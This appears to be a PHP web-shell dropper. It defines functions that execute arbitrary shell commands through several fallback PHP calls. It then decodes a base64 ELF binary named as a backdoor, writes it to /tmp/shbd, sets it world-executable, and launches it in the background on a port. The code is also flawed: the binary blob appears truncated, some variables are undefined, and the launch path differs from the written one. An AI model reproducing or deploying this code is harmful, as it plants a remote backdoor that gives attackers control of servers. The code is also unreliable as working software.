<?php
function cfb($fname,$text)
{
    $w_file=@fopen($fname,"w");
    if($w_file)
    {
        @fputs($w_file,@base64_decode($text));
		@fclose($w_file);
	}
}


function ex($cfe)
{
	$res = '';
	if (!empty($cfe))
	{
		if(function_exists('exec'))
		{
			@exec($cfe,$res);
			$res = join("\n",$res);
		}
		elseif(function_exists('shell_exec'))
		{
			$res = @shell_exec($cfe);
		}
		elseif(function_exists('system'))
		{
			@ob_start();
			@system($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		}
		elseif(function_exists('passthru'))
		{
			@ob_start();
			@passthru($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		}
		elseif(@is_resource($f = @popen($cfe,"r")))
		{
			$res = "";
			while(!@feof($f)) { $res .= @fread($f,1024); }
			@pclose($f);
		}
		}
	return $res;
}

function myshellexec($cmd)
{
	$result = '';
	if (is_callable('exec') and !in_array('exec',$disablefunc)) {
		exec($cmd , $result);
	}
	elseif (is_callable("system") and !in_array("system",$disablefunc)) {
		$v = @ob_get_contents(); 
		@ob_clean(); 
		system($cmd); 
		$result = @ob_get_contents(); 
		@ob_clean(); 
		echo $v;
	}
	elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {
		$v = @ob_get_contents(); 
		@ob_clean(); 
		passthru($cmd); 
		$result = @ob_get_contents(); 
		@ob_clean(); 
		echo $v;
		}

    return $result;
}

$backdoor="f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAoIUECDQAAAD4EgAAAAAAADQAIAAHACgAIgAfAAYAAAA0AAAANIAECDSABAjgAAAA4AAAAAUAAAAEAAAAAwAAABQBAAAUgQQIFIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQIrAkAAKwJAAAFAAAAABAAAAEAAACsCQ";

cfb("/tmp/shbd",$backdoor);
ex("chmod 777 /tmp/shbd");
$cmd = "./tmp/shbd $por";
exec("$cmd > /dev/null &");
$scan = myshellexec("ps aux");  
?>